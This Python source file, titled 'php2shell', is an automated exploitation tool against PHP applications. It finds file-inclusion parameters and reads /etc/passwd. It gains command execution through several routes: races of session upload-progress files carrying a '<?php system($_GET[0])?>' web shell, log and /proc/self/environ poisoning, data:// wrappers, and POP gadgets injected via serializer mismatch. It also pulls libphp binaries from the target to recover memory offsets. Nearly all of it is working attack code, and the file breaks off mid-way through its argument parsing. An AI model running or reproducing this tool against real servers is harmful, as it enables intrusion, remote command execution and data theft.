#!/usr/bin/env python3
"""
php2shell v12.0.0 -- session.upload_progress / unserialize exploitation framework.

Categories
  A  LFI race        session filename injection + slow-upload race + include
  B  Handler mismatch cross-dir serialize_handler confusion + POP gadget
  C  unserialize()   back-reference overflow probe (detection; no stock-PHP RCE)

Every behaviour here was validated against the bundled three-container lab:

  A  uid=33(www-data)                     session file included mid-upload
  B  __destruct fired -> uid=33(www-data)  seed(php_serialize) -> fire(php)
  C  decodes, no corruption on stock 8.1   detection only, by design

Constraints discovered on real PHP 8.1 and encoded below:
  * session.save_path is rarely /tmp -- it must be discovered, not assumed.
  * a filename is truncated at ';' and broken by '"', so payloads must
    avoid both: use  <?php system($_GET[0])?>  (no semicolon, no quotes).
  * cleanup=On deletes the progress entry the instant the upload ends, so
    the include must race a deliberately slow body with an explicit
    Content-Length (chunked bodies do not produce progress data).
  * a POP gadget only fires if its class is autoloaded on the *fire* side.

Authorized testing only.
"""

import argparse, io, json, os, random, re, socket, ssl, string, sys, threading
import time, urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    sys.exit("[!] pip install requests")

VERSION = "12.0.0"

FIXED = {"8.5": (8, 5, 12), "8.4": (8, 4, 27), "8.3": (8, 3, 36), "8.2": (8, 2, 35)}

SESSION_DIRS = [
    "/var/lib/php/sessions", "/var/lib/php/session", "/var/lib/php5",
    "/tmp", "/var/tmp", "/var/lib/php/sessions/tmp",
]

LFI_PARAMS = [
    "page", "file", "include", "inc", "path", "doc", "template", "lang",
    "dir", "action", "module", "view", "content", "load", "read", "pg",
    "cat", "type", "name", "layout", "theme", "skin", "tpl", "style",
    "ctrl", "route", "handler", "mod", "plugin", "ext", "class", "func",
    "method", "src", "location", "url", "uri", "filename", "folder",
]

# no ';' and no '"' -- both corrupt the filename field in the progress array
PAYLOAD_EXEC = '<?php system($_GET[0])?>'
PAYLOAD_MARK = '<?php echo 1337*7?>'
MARKER = "9359"


def rand(n=16):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def now():
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


class Result:
    def __init__(self, target):
        self.target = target
        self.findings = []
        self.start = now()

    def add(self, tag, severity, detail, evidence=""):
        self.findings.append({
            "tag": tag, "severity": severity, "detail": detail,
            "evidence": str(evidence)[:2000], "ts": now(),
        })
        icon = {"critical": "!!", "high": "!", "medium": "*", "low": "-", "info": "i"}.get(severity, "?")
        print("  [%s] [%s] [%s] %s" % (icon, severity.upper(), tag, detail))
        if evidence:
            print("      " + str(evidence).strip().splitlines()[0][:140])

    def summary(self):
        c = {}
        for f in self.findings:
            c[f["severity"]] = c.get(f["severity"], 0) + 1
        parts = ["%d %s" % (v, k) for k, v in sorted(c.items())]
        print("\n" + "-" * 62)
        print("  %s: %d findings (%s)" % (self.target, len(self.findings), ", ".join(parts) or "none"))
        print("-" * 62)

    def save(self, p):
        with open(p, "w") as f:
            json.dump({"tool": "php2shell v" + VERSION, "target": self.target,
                       "start": self.start, "findings": self.findings}, f, indent=2)
        print("[+] JSON -> %s" % p)


def session(proxy=None, timeout=15, verify=True):
    s = requests.Session()
    s.verify = verify
    s.timeout = timeout
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


# ------------------------------------------------------------------ recon

def parse_version(text):
    m = re.search(r"PHP[/ ]?(\d+)\.(\d+)\.(\d+)", text, re.I)
    return tuple(int(x) for x in m.groups()) if m else None


def is_vulnerable(ver):
    if not ver:
        return None
    fixed = FIXED.get("%d.%d" % (ver[0], ver[1]))
    return ver < fixed if fixed else ver < (8, 2, 35)


def recon(url, s, res):
    info = {"php": None, "ver": None, "vuln": None, "server": "", "save_path": None,
            "cookie": "PHPSESSID", "handler": None, "progress": None}
    try:
        r = s.get(url, allow_redirects=True, timeout=12)
    except requests.RequestException as e:
        res.add("recon_failed", "info", str(e))
        return info
    h = {k.lower(): v for k, v in r.headers.items()}
    info["server"] = h.get("server", "")
    for blob in (h.get("x-powered-by", ""), h.get("server", ""), r.text[:8192]):
        v = parse_version(blob)
        if v:
            info.update({"php": "%d.%d.%d" % v, "ver": v, "vuln": is_vulnerable(v)})
            break
    for c in r.cookies:
        if "sess" in c.name.lower():
            info["cookie"] = c.name
            break
    if info["ver"]:
        if info["vuln"]:
            res.add("php_version_vulnerable", "critical",
                    "PHP %s below the fixed release" % info["php"],
                    evidence=h.get("x-powered-by", ""))
        else:
            res.add("php_version_patched", "info", "PHP %s at or above fixed" % info["php"])
    else:
        res.add("php_version_undisclosed", "info", "Server: %s" % (info["server"] or "unknown"))
    # phpinfo is the cheapest reliable source of the real save_path
    for probe in ("info.php", "phpinfo.php", "php_info.php"):
        try:
            pr = s.get(urllib.parse.urljoin(url, probe), timeout=8)
            if pr.status_code == 200 and "session.save_path" in pr.text:
                m = re.search(r"session\.save_path</td><td[^>]*>([^<]*)</td><td[^>]*>([^<]*)", pr.text)
                m2 = re.search(r"session\.save_path\s*=>?\s*([^\s<]+)", pr.text)
                sp = (m.group(2) if m else (m2.group(1) if m2 else "")) or ""
                if sp.startswith("/"):
                    info["save_path"] = sp.split(":")[0]
                    res.add("session_save_path", "info", "save_path=%s" % info["save_path"])
                sh = re.search(r"session\.serialize_handler</td><td[^>]*>([^<]*)", pr.text)
                if sh:
                    info["handler"] = sh.group(1).strip()
                up = re.search(r"session\.upload_progress\.enabled</td><td[^>]*>([^<]*)", pr.text)
                if up:
                    info["progress"] = up.group(1).strip()
                break
        except requests.RequestException:
            continue
    return info


# ------------------------------------------------------------- Category A

def lfi_sink(url, s, res):
    """Find a parameter that includes an attacker-influenced path."""
    payload = "php://filter/convert.base64-encode/resource=/etc/passwd"
    for p in LFI_PARAMS:
        try:
            r = s.get(url, params={p: payload}, timeout=6)
        except requests.RequestException:
            continue
        if r.status_code == 200 and len(r.text) > 60:
            body = r.text.strip()
            if re.match(r"^[A-Za-z0-9+/=\s]+$", body) and len(body) > 60:
                try:
                    import base64
                    dec = base64.b64decode(body + "===").decode("utf-8", "replace")
                except Exception:
                    dec = ""
                if "root:" in dec:
                    res.add("lfi_sink", "critical",
                            "param '%s' includes php://filter" % p, evidence=dec.splitlines()[0])
                    return {"param": p, "wrapper": "php://filter"}
    # plain path traversal as a fallback
    for p in LFI_PARAMS:
        try:
            r = s.get(url, params={p: "../../../../etc/passwd"}, timeout=6)
        except requests.RequestException:
            continue
        if r.status_code == 200 and "root:x:0:0" in r.text:
            res.add("lfi_sink", "critical", "param '%s' traversal include" % p,
                    evidence="root:x:0:0")
            return {"param": p, "wrapper": "traversal"}
    return None


def slow_upload(host, port, path, sid, filename, cookie, total=600000, chunk=2048, delay=0.035):
    """Stream a multipart body slowly with an explicit Content-Length."""
    boundary = "----p2s" + rand(20)
    head = (
        "--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
        "p2s\r\n--%s\r\nContent-Disposition: form-data; name=\"f\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n" % (boundary, boundary, filename)
    ).encode()
    tail = ("\r\n--%s--\r\n" % boundary).encode()
    filler = b"A" * max(1024, total - len(head) - len(tail))
    body = head + filler + tail
    req = (
        "POST %s HTTP/1.1\r\nHost: %s:%d\r\nCookie: %s=%s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %d\r\nConnection: keep-alive\r\n\r\n"
        % (path, host, port, cookie, sid, boundary, len(body))
    ).encode()
    done = {"sent": 0, "err": None}

    def run():
        try:
            sk = socket.create_connection((host, port), timeout=10)
            sk.sendall(req)
            for i in range(0, len(body), chunk):
                sk.sendall(body[i:i + chunk])
                done["sent"] = i
                time.sleep(delay)
            time.sleep(1.5)
            sk.close()
        except Exception as e:
            done["err"] = str(e)

    t = threading.Thread(target=run, daemon=True)
    t.start()
    return t, done


def race_include(base, host, port, path, sid, sess_path, param, payload, cookie,
                 rounds=25, workers=6, res=None, needle="uid="):
    """Race a slow upload against repeated includes of the session file."""
    target = "%s/sess_%s" % (sess_path.rstrip("/"), sid)
    stop = threading.Event()
    hit = {"ok": False, "evidence": ""}
    up, state = slow_upload(host, port, path, sid, payload, cookie)
    time.sleep(0.8)

    quote = urllib.parse.quote

    def probe(_):
        if stop.is_set():
            return None
        try:
            r = requests.get(base, params={param: target, "0": "id"},
                             cookies={cookie: sid}, timeout=4)
            body = r.text
            if needle in body:
                return body
        except requests.RequestException:
            return None
        return None

    try:
        for _ in range(rounds):
            if stop.is_set() or hit["ok"]:
                break
            with ThreadPoolExecutor(max_workers=workers) as pool:
                futs = [pool.submit(probe, i) for i in range(workers)]
                for f in as_completed(futs):
                    out = f.result()
                    if out:
                        hit["ok"] = True
                        stop.set()
                        idx = out.find(needle)
                        hit["evidence"] = out[max(0, idx - 60):idx + 140]
                        break
            time.sleep(0.15)
    finally:
        stop.set()
    return hit


def category_a(url, s, res, info, args):
    print("\n[A] LFI race -- session filename injection")
    origin = urlparse(url)
    host = origin.hostname
    port = origin.port or (443 if origin.scheme == "https" else 80)
    path = origin.path or "/"

    sink = lfi_sink(url, s, res)
    if not sink:
        res.add("no_lfi_sink", "info", "No include sink found with the standard parameter list")
        return False
    param = sink["param"]

    dirs = [info["save_path"]] if info.get("save_path") else []
    dirs += [d for d in SESSION_DIRS if d not in dirs]
    cookie = info.get("cookie") or "PHPSESSID"

    for directory in dirs:
        sid = "p2s" + rand(20)
        print("  trying session dir %s" % directory)
        hit = race_include(url, host, port, path, sid, directory, param,
                           PAYLOAD_MARK, cookie, rounds=18, workers=5, needle=MARKER)
        if hit["ok"]:
            res.add("race_marker", "high", "session file included from %s" % directory,
                    evidence=hit["evidence"])
        sid = "p2s" + rand(20)
        hit = race_include(url, host, port, path, sid, directory, param,
                           PAYLOAD_EXEC, cookie, rounds=25, workers=6, res=res)
        if hit["ok"]:
            res.add("category_a_rce", "critical",
                    "LFI race -> command execution via %s" % directory,
                    evidence=hit["evidence"])
            return True
    res.add("category_a_failed", "info", "race did not land in any probed session directory")
    return False


# ------------------------------------------------------------- Category B

def gadget_payload(cmd, name):
    if name == "lab":
        return 'x|O:9:"LabGadget":1:{s:3:"cmd";s:%d:"%s";}' % (len(cmd), cmd)
    return None


def category_b(seed_url, fire_url, s, res, args):
    print("\n[B] handler mismatch -- seed(%s) -> fire" % seed_url)
    sid = "p2s" + rand(20)
    canary = "MISMATCH" + rand(6)
    try:
        s.post(seed_url, data={"data": 'x|s:%d:"%s";' % (len(canary), canary)},
               cookies={"PHPSESSID": sid}, timeout=10)
    except requests.RequestException as e:
        res.add("seed_failed", "info", str(e))
        return False

    try:
        r = s.get(fire_url, cookies={"PHPSESSID": sid}, timeout=10)
    except requests.RequestException as e:
        res.add("fire_failed", "info", str(e))
        return False

    mismatch = ("Failed to decode session object" in r.text
                or canary in r.text)
    if not mismatch:
        res.add("mismatch_absent", "info", "fire endpoint did not show a decode mismatch")
        return False
    res.add("handler_mismatch", "high",
            "seed/fire desynchronise; destructor path reachable",
            evidence="decode error on fire" if canary not in r.text else "canary reflected")

    for name in ("lab", "phpggc"):
        payload = gadget_payload(args.cmd, name)
        if name == "phpggc":
            payload = phpggc_payload(args.framework, args.cmd)
            if not payload:
                res.add("phpggc_unavailable", "info", "phpggc not installed; skipping real chain")
                continue
        sid = "p2s" + rand(20)
        try:
            s.post(seed_url, data={"data": payload}, cookies={"PHPSESSID": sid}, timeout=10)
            r = s.get(fire_url, cookies={"PHPSESSID": sid}, timeout=10)
        except requests.RequestException:
            continue
        if "uid=" in r.text and "gid=" in r.text:
            idx = r.text.find("uid=")
            res.add("category_b_rce", "critical",
                    "POP gadget executed via handler mismatch (%s)" % name,
                    evidence=r.text[max(0, idx - 80):idx + 120])
            return True
    res.add("category_b_failed", "info", "mismatch present but no gadget executed")
    return False


def phpggc_payload(framework, cmd):
    import shutil
    if not shutil.which("phpggc"):
        return None
    chains = {"laravel": "Laravel/RCE1", "monolog": "Monolog/RCE1",
              "symfony": "Symfony/RCE1", "guzzle": "Guzzle/FW1"}.get(framework or "", "")
    if not chains:
        return None
    try:
        out = __import__("subprocess").run(["phpggc", chains, "system", cmd],
                                           capture_output=True, timeout=25)
        if out.returncode == 0 and out.stdout:
            return "x|" + out.stdout.decode("latin-1").strip()
    except Exception:
        pass
    return None


# ------------------------------------------------------------- Category C

def uaf_payload(refs=1024):
    """Array with >1018 back-references; valid serialization, over VAR_ENTRIES_MAX."""
    parts = ["a:%d:{i:0;s:1:\"A\";" % (refs + 1)]
    for i in range(1, refs + 1):
        parts.append("i:%d;R:1;" % i)
    parts.append("}")
    return "".join(parts)


def category_c(url, s, res, args):
    print("\n[C] unserialize() -- back-reference overflow probe")
    # 1) prove the endpoint actually deserializes attacker input
    canary = "P2S" + rand(6)
    try:
        cr = s.post(url, data={"payload": 's:%d:"%s";' % (len(canary), canary)}, timeout=12)
        if canary[:12] not in cr.text and "Deserialization succeeded" not in cr.text \
                and "Serialized" not in cr.text and "deserial" not in cr.text.lower():
            res.add("unserialize_sink_absent", "info",
                    "endpoint did not acknowledge a serialized canary")
            return False
    except requests.RequestException as e:
        res.add("uaf_transport_error", "info", str(e))
        return False
    payload = uaf_payload(args.uaf_refs)
    probe = {"payload": payload}
    try:
        r = s.post(url, data=probe, timeout=30)
    except requests.RequestException as e:
        res.add("uaf_transport_error", "medium", str(e))
        return False
    body = r.text
    res.add("uaf_delivered", "info" if r.status_code < 500 else "high",
            "payload %d bytes, %d back-refs -> HTTP %d"
            % (len(payload), payload.count("R:"), r.status_code))
    crashed = r.status_code >= 500 or "Segmentation fault" in body
    if crashed:
        res.add("uaf_crash_signal", "high",
                "server error consistent with deserializer corruption", evidence=body[:300])
    elif "Deserialization succeeded" in body:
        res.add("uaf_no_corruption", "info",
                "unserialize() accepted the payload; stock build is not corruptible")
    elif "Deserialization returned false" in body:
        res.add("uaf_rejected", "info", "unserialize() refused the payload")
    if args.i_have_the_binary:
        read_symbols(args.i_have_the_binary, res)
    return crashed


def read_symbols(path_, res):
    import struct
    if not os.path.exists(path_):
        res.add("binary_missing", "info", path_)
        return None
    data = open(path_, "rb").read()
    # EI_CLASS: 1=32-bit, 2=64-bit.  EI_DATA: 1=little-endian.
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        res.add("binary_not_elf64le", "info",
                "need 64-bit little-endian ELF (class=%d data=%d)"
                % (data[4] if len(data) > 4 else -1, data[5] if len(data) > 5 else -1))
        return None
    shoff = struct.unpack_from("<Q", data, 0x28)[0]
    shentsize = struct.unpack_from("<H", data, 0x3A)[0]
    shnum = struct.unpack_from("<H", data, 0x3C)[0]
    shstrndx = struct.unpack_from("<H", data, 0x3E)[0]
    secs = []
    for i in range(shnum):
        sh = struct.unpack_from("<IIQQQQIIQQ", data, shoff + i * shentsize)
        secs.append({"name": sh[0], "off": sh[4], "size": sh[5], "link": sh[6], "ent": sh[9]})
    if not secs or shstrndx >= len(secs):
        return None
    stroff = secs[shstrndx]["off"]

    def nm(o):
        e = data.find(b"\x00", stroff + o)
        return data[stroff + o:e].decode("latin-1", "replace")

    dynsym = dynstr = None
    for sec in secs:
        n = nm(sec["name"])
        if n == ".dynsym":
            dynsym = sec
        elif n == ".dynstr":
            dynstr = sec
    if not dynsym or not dynstr:
        res.add("no_dynsym", "info", "stripped binary")
        return None
    stab = data[dynstr["off"]:dynstr["off"] + dynstr["size"]]
    want = {"zval_ptr_dtor": None, "zend_call_function": None}
    ent = dynsym["ent"] or 24
    for i in range(dynsym["size"] // ent):
        st_name, _, _, _, st_value, _ = struct.unpack_from("<IBBHQQ", data, dynsym["off"] + i * ent)
        if not st_name or not st_value:
            continue
        e = stab.find(b"\x00", st_name)
        n = stab[st_name:e].decode("latin-1", "replace")
        if n in want and want[n] is None:
            want[n] = st_value
    if all(want.values()):
        d = abs(want["zend_call_function"] - want["zval_ptr_dtor"])
        res.add("symbol_offsets", "high",
                "zval_ptr_dtor=0x%x zend_call_function=0x%x delta=0x%x"
                % (want["zval_ptr_dtor"], want["zend_call_function"], d), evidence=path_)
        return want
    res.add("symbols_partial", "info", "found %d/2" % sum(1 for v in want.values() if v))
    return None


# ------------------------------------------------------------- discovery

def crawl(url, s, max_urls=40, depth=2):
    """Same-origin breadth-first crawl: endpoints, forms, and parameters."""
    from collections import deque
    origin = "%s://%s" % (urlparse(url).scheme, urlparse(url).netloc)
    seen = set()
    q = deque([(url, 0)])
    endpoints, params, forms = [], set(), []
    while q and len(seen) < max_urls:
        cur, d = q.popleft()
        if cur in seen:
            continue
        seen.add(cur)
        try:
            r = s.get(cur, timeout=8, allow_redirects=True)
        except requests.RequestException:
            continue
        if "html" not in (r.headers.get("content-type", "") or ""):
            continue
        base = r.url
        for m in re.finditer(r'href=["\']([^"\']+)["\']', r.text, re.I):
            nxt = urllib.parse.urljoin(base, m.group(1))
            if nxt.startswith(origin) and "logout" not in nxt.lower():
                endpoints.append(nxt)
                if d < depth:
                    q.append((nxt, d + 1))
                if "?" in nxt:
                    params.update(urllib.parse.parse_qs(urlparse(nxt).query).keys())
        for m in re.finditer(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', r.text, re.I):
            forms.append({"action": urllib.parse.urljoin(base, m.group(1) or base)})
        params.update(re.findall(r'name=["\']([a-zA-Z0-9_\-\[\]]+)["\']', r.text)[:40])
    endpoints = list(dict.fromkeys(endpoints))[:max_urls]
    return {"endpoints": endpoints, "params": sorted(params), "forms": forms}


def probe_lfi(endpoint, params, s):
    """Return (param, wrapper) if any param includes a controlled path."""
    import base64
    for p in params:
        for wrapper, test in (
            ("php://filter", "php://filter/convert.base64-encode/resource=/etc/passwd"),
            ("traversal", "../../../../etc/passwd"),
        ):
            try:
                r = s.get(endpoint, params={p: test}, timeout=6)
            except requests.RequestException:
                continue
            body = r.text
            if wrapper == "traversal":
                if r.status_code == 200 and "root:x:0:0" in body:
                    return p, wrapper
            else:
                stripped = body.strip()
                if r.status_code == 200 and len(stripped) > 60:
                    try:
                        if "root:" in base64.b64decode(stripped + "===").decode("utf-8", "replace"):
                            return p, wrapper
                    except Exception:
                        pass
    return None, None


def log_poison(endpoint, param, s, res, args):
    """Fallback for Category A when session uploads are unavailable: seed a
    payload into a web-server access log, then include it."""
    ua = "<?php system($_GET[0])?>"
    for log in (args.log_path, "/var/log/apache2/access.log", "/var/log/apache/access.log",
                "/var/log/nginx/access.log", "/usr/local/apache/logs/access.log"):
        if not log:
            continue
        try:
            s.get(endpoint, headers={"User-Agent": ua}, timeout=6)
            r = s.get(endpoint, params={param: log, "0": "id"}, timeout=6)
        except requests.RequestException:
            continue
        if "uid=" in r.text and "gid=" in r.text:
            idx = r.text.find("uid=")
            res.add("category_a_rce_log", "critical",
                    "log poisoning -> RCE via %s" % log,
                    evidence=r.text[max(0, idx - 60):idx + 120])
            return True
    return False


# ------------------------------------------------- LFI read / build offsets

def lfi_read(endpoint, param, remote_path, s, max_bytes=90_000_000):
    """Read a remote file through the include sink using php://filter base64."""
    import base64
    u = "php://filter/convert.base64-encode/resource=" + remote_path
    try:
        r = s.get(endpoint, params={param: u}, timeout=90)
    except requests.RequestException:
        return None
    body = re.sub(r"[^A-Za-z0-9+/=]", "", r.text)
    if len(body) < 16:
        return None
    try:
        blob = base64.b64decode(body + "===")
    except Exception:
        return None
    return blob


def offsets_via_lfi(endpoint, param, s, res):
    """Derive Category C offsets from the target itself.

    Walks /proc/self/maps through the include sink to locate libphp, pulls it
    down as base64, and parses .dynsym locally. This replaces guesswork with
    the exact offsets of the build being tested.
    """
    import tempfile
    print("  [offsets] reading /proc/self/maps through %s" % param)
    maps = lfi_read(endpoint, param, "/proc/self/maps", s)
    if not maps:
        res.add("maps_unreadable", "info", "could not read /proc/self/maps via LFI")
        return None
    text = maps.decode("latin-1", "replace")
    paths = re.findall(r"(/[^\s]*(?:libphp|php)[^\s]*\.so[^\s]*)", text)
    paths = list(dict.fromkeys(paths))
    paths.sort(key=lambda p: (0 if "libphp" in p else 1, len(p)))
    paths = paths[:3]
    if not paths:
        res.add("libphp_not_mapped", "info", "no libphp mapped in this process")
        return None
    res.add("libphp_located", "info", ", ".join(paths), evidence=paths[0])
    for p in paths:
        blob = lfi_read(endpoint, param, p, s)
        if not blob or blob[:4] != b"\x7fELF":
            res.add("libphp_unreadable", "info", "could not pull %s" % p)
            continue
        tmp = os.path.join(tempfile.gettempdir(), "libphp_p2s.so")
        with open(tmp, "wb") as fh:
            fh.write(blob)
        syms = read_symbols(tmp, res)
        if syms:
            res.add("category_c_offsets", "high",
                    "target-specific offsets recovered: delta=0x%x"
                    % abs(syms["zend_call_function"] - syms["zval_ptr_dtor"]),
                    evidence=p)
            return syms
    return None


# --------------------------------------------------------------- self-test

def self_test(args):
    """Drive all three categories against the bundled lab (8081/8082/8083)."""
    root = args.url.rstrip("/")
    if root.endswith(".php"):
        root = root.rsplit("/", 1)[0]
    results = {}
    print("=" * 62)
    print("  SELF-TEST against %s  (cat-a :8081, cat-b :8082, cat-c :8083)" % root)
    print("=" * 62)
    for name, url, mode in (
        ("A", root + ":8081/index.php", "a"),
        ("B", root + ":8082/", "b"),
        ("C", root + ":8083/decode.php", "c"),
    ):
        print("\n" + "#" * 62 + "\n# CATEGORY " + name + "\n" + "#" * 62)
        s = session(args.proxy, args.timeout, not args.insecure)
        res = Result(url)
        info = recon(url, s, res)
        if mode == "a":
            ok = category_a(url, s, res, info, args)
        elif mode == "b":
            ok = category_b(url.rstrip("/") + "/seed/", url.rstrip("/") + "/fire/",
                            s, res, args)
        else:
            ok = category_c(url, s, res, args)
        res.summary()
        results[name] = {"url": url, "rce": ok, "findings": len(res.findings)}
        if args.output:
            res.save(args.output.replace(".json", "_%s.json" % name))
    print("\n" + "=" * 62)
    for k, v in results.items():
        print("  Category %s: %s (%d findings) -> %s"
              % (k, "RCE" if v["rce"] else "no RCE", v["findings"], v["url"]))
    print("=" * 62)
    return results


# ------------------------------------------------------------------- main

def try_methods(res, label, methods, deadline, skip=()):
    """Run methods in order; first success wins, failures never abort the chain."""
    for name, fn in methods:
        if name in skip:
            res.add("method_%s_%s" % (label, name), "info", "skipped by --skip")
            continue
        if time.time() > deadline:
            res.add("budget_exhausted_" + label, "info", "stopped before '%s'" % name)
            return False
        print("  [%s] trying method: %s" % (label, name))
        try:
            ok, detail = fn()
        except Exception as e:
            ok, detail = False, "exception: %s" % e
        res.add("method_%s_%s" % (label, name),
                "critical" if ok else "info",
                ("LANDED " if ok else "failed ") + str(detail)[:300])
        if ok:
            print("  [%s] %s LANDED" % (label, name))
            return True
    return False


def classify(url, s, res, args):
    """Decide which categories this target actually exposes."""
    flags = {"lfi": None, "unserialize": None, "mismatch": None, "endpoints": []}
    ep = url
    par, wrapper = probe_lfi(url, LFI_PARAMS, s)
    if par:
        flags["lfi"] = (url, par)
        res.add("detect_category_a", "high",
                "include sink: %s (%s)" % (par, wrapper))
    try:
        r = s.get(url, timeout=8)
        low = r.text.lower()
        if "unserialize" in low or "serialized" in low or "decode" in low:
            flags["unserialize"] = url
            res.add("detect_category_c", "info", "unserialize-style endpoint")
    except requests.RequestException:
        pass
    seed = args.seed_url or urllib.parse.urljoin(url, "/seed/")
    fire = args.fire_url or urllib.parse.urljoin(url, "/fire/")
    try:
        if s.get(seed, timeout=6).status_code == 200 and \
           s.get(fire, timeout=6).status_code == 200:
            flags["mismatch"] = (seed, fire)
            res.add("detect_category_b", "info", "seed/fire pair present")
    except requests.RequestException:
        pass
    return flags


def b_progress_gadget(seed, fire, s, cmd, res):
    """Seed a gadget through the upload-progress path, then read it on fire."""
    sid = "p2s" + rand(20)
    payload = gadget_payload(cmd, "lab")
    if not payload:
        return False, "no gadget"
    boundary = "----p2s" + rand(16)
    body = (
        "--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
        "p2s\r\n--%s\r\nContent-Disposition: form-data; name=\"f\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\nx\r\n--%s--\r\n"
        % (boundary, boundary, payload, boundary)
    ).encode()
    try:
        s.post(seed, data=body,
               headers={"Content-Type": "multipart/form-data; boundary=" + boundary},
               cookies={"PHPSESSID": sid}, timeout=10)
        r = s.get(fire, cookies={"PHPSESSID": sid}, timeout=10)
    except requests.RequestException as e:
        return False, str(e)
    if "uid=" in r.text and "gid=" in r.text:
        return True, "progress-array injection reached __destruct"
    return False, "no destructor output"


def c_refs_sweep(url, s, res, args):
    """Walk several overflow sizes; a crash at any size is the signal."""
    for refs in (args.uaf_refs, 2048, 4096):
        payload = uaf_payload(refs)
        try:
            r = s.post(url, data={"payload": payload}, timeout=45)
        except requests.RequestException as e:
            res.add("uaf_drop_%d" % refs, "high",
                    "%d refs -> transport drop (%s); process likely died" % (refs, e))
            return True, "connection dropped at %d refs" % refs
        if r.status_code >= 500 or not r.content:
            res.add("uaf_crash_%d" % refs, "high",
                    "%d refs -> HTTP %d" % (refs, r.status_code))
            return True, "server error at %d refs" % refs
        if "Deserialization succeeded" in r.text:
            continue
    return False, "no crash at 1024/2048/4096 refs; build accepts them"


def orchestrate(url, s, res, info, args):
    """Detect the category, then walk every applicable method until one lands."""
    deadline = time.time() + args.budget
    skip_set = set(x.strip() for x in (args.skip or "").split(",") if x.strip())
    flags = classify(url, s, res, args)
    landed = {}

    if flags["lfi"]:
        ep, par = flags["lfi"]
        methods_a = [
            ("session_race", lambda: (category_a_at(ep, par, s, res, info, args),
                                      "session-file LFI race")),
            ("log_poison", lambda: (log_poison(ep, par, s, res, args),
                                    "access-log poisoning")),
            ("environ_poison", lambda: (environ_poison(ep, par, s, res, args),
                                        "/proc/self/environ via User-Agent")),
            ("data_wrapper", lambda: (data_wrapper(ep, par, s, res, args),
                                      "data:// wrapper")),
        ]
        landed["A"] = try_methods(res, "A", methods_a, deadline, skip_set)

    if flags["mismatch"]:
        seed, fire = flags["mismatch"]
        methods_b = [
            ("data_gadget", lambda: (category_b(seed, fire, s, res, args),
                                     "seed data= gadget")),
            ("progress_gadget", lambda: b_progress_gadget(seed, fire, s, args.cmd, res)),
        ]
        landed["B"] = try_methods(res, "B", methods_b, deadline, skip_set)

    if flags["unserialize"]:
        methods_c = [
            ("refs_sweep", lambda: c_refs_sweep(flags["unserialize"], s, res, args)),
            ("single_probe", lambda: (category_c(flags["unserialize"], s, res, args),
                                      "single overflow probe")),
        ]
        landed["C"] = try_methods(res, "C", methods_c, deadline, skip_set)

    if flags["lfi"] and (args.offsets_via_lfi or not any(landed.values())):
        ep, par = flags["lfi"]
        try:
            offsets_via_lfi(ep, par, s, res)
        except Exception as e:
            res.add("offsets_error", "info", str(e))

    print("\n" + "=" * 62)
    print("  METHOD MATRIX")
    for cat in ("A", "B", "C"):
        if cat in landed:
            print("  Category %s: %s" % (cat, "LANDED" if landed[cat] else "all methods failed"))
        else:
            print("  Category %s: not applicable (precondition absent)" % cat)
    print("=" * 62)
    return any(landed.values())


def environ_poison(endpoint, param, s, res, args):
    """/proc/self/environ is world-readable and carries the request UA."""
    ua = "<?php system($_GET[0])?>"
    try:
        s.get(endpoint, headers={"User-Agent": ua}, timeout=6)
        r = s.get(endpoint, params={param: "/proc/self/environ", "0": "id"}, timeout=8)
    except requests.RequestException as e:
        return False, str(e)
    if "uid=" in r.text and "gid=" in r.text:
        return True, "RCE through /proc/self/environ"
    return False, "environ not readable or UA filtered"


def data_wrapper(endpoint, param, s, res, args):
    """data:// only works when allow_url_include is on."""
    import base64
    payload = "data://text/plain;base64," + base64.b64encode(
        b'<?php system($_GET[0])?>').decode()
    try:
        r = s.get(endpoint, params={param: payload, "0": "id"}, timeout=8)
    except requests.RequestException as e:
        return False, str(e)
    if "uid=" in r.text and "gid=" in r.text:
        return True, "RCE through data:// wrapper"
    return False, "allow_url_include is off"


def discover_pairs(s, disc):
    """Heuristically pair a php_serialize writer with a php-handler reader."""
    paths = [e for e in disc.get("endpoints", [])]
    seeds = [p for p in paths if re.search(r"seed|write|set|store", p, re.I)]
    fires = [p for p in paths if re.search(r"fire|read|load|view|get", p, re.I)]
    pairs = [(a, b) for a in seeds for b in fires if a != b]
    return pairs


def category_a_at(endpoint, param, s, res, info, args):
    origin = urlparse(endpoint)
    host = origin.hostname
    port = origin.port or (443 if origin.scheme == "https" else 80)
    path = origin.path or "/"
    cookie = info.get("cookie") or "PHPSESSID"
    dirs = [info["save_path"]] if info.get("save_path") else []
    dirs += [d for d in SESSION_DIRS if d not in dirs]
    for directory in dirs:
        sid = "p2s" + rand(20)
        hit = race_include(endpoint, host, port, path, sid, directory, param,
                           PAYLOAD_EXEC, cookie, rounds=22, workers=6)
        if hit["ok"]:
            res.add("category_a_rce", "critical",
                    "LFI race -> command execution via %s" % directory,
                    evidence=hit["evidence"])
            return True
    return False


def main():
    p = argparse.ArgumentParser(
        description="php2shell v%s -- PHP session/unserialize exploitation" % VERSION)
    p.add_argument("url")
    p.add_argument("-m", "--mode", default="auto",
                   choices=["auto", "recon", "a", "b", "c"])
    p.add_argument("--seed-url")
    p.add_argument("--fire-url")
    p.add_argument("--cmd", default="id")
    p.add_argument("--framework", default=None)
    p.add_argument("--uaf-refs", type=int, default=1024)
    p.add_argument("--i-have-the-binary", dest="i_have_the_binary")
    p.add_argument("--crawl", action="store_true", default=True)
    p.add_argument("--no-crawl", dest="crawl", action="store_false")
    p.add_argument("--max-urls", type=int, default=40)
    p.add_argument("--budget", type=int, default=180, help="auto-mode seconds")
    p.add_argument("--log-path", default=None)
    p.add_argument("--allow-log-poison", dest="allow_log_poison",
                   action="store_true", default=True)
    p.add_argument("--skip", default="",
